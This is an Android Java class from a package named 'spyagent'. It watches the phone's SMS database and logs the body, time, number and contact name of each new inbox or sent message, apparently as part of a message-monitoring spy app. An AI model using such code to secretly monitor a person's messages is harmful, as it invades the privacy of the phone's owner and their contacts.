package com.irodyk.spyagent;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;

/**
 * Created by i.rodyk on 8/30/16.
 */
public class SmsObserver extends ContentObserver {

    private final String TAG = this.getClass().getSimpleName();

    private Context mContext;
    static final Uri SMS_URI = Uri.parse("content://sms");

    public SmsObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
    }

    @Override
    public boolean deliverSelfNotifications() { //onChange() is called twice if return false
        return true;
    }

    @Override
    public void onChange(boolean bSelfChange){
        super.onChange(bSelfChange);
        Log.e(TAG, "Sms database has changed");

        Cursor c = mContext.getContentResolver().query(SMS_URI, null, null, null, null);

        if(c == null) return;
        c.moveToNext(); //point to the latest message!

        int smsType = Integer.valueOf(c.getString(c.getColumnIndex("type")));
        if (smsType == 1 || smsType == 2){ //inbox and sent
            String type = (smsType == 1) ? "Inbox" : "Sent";
            String smsTime = c.getString(c.getColumnIndex("date"));
            String smsBody = c.getString(c.getColumnIndex("body"));
            String smsAddress = c.getString(c.getColumnIndex("address"));
            String personName = getContactName(smsAddress);

            Log.d(TAG, "type: " + type + "\nsmsTime: " + smsTime + "\nsmsBody: " +smsBody + "\nnumber: " + smsAddress+"\nPerson: " + personName);
        }else{
            //DO NOTHING
        }
        c.close();
    }

    private String getContactName(String phoneNumber) {
        ContentResolver cr = mContext.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if(cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }

        if(!cursor.isClosed()) {
            cursor.close();
        }

        return contactName;
    }
}
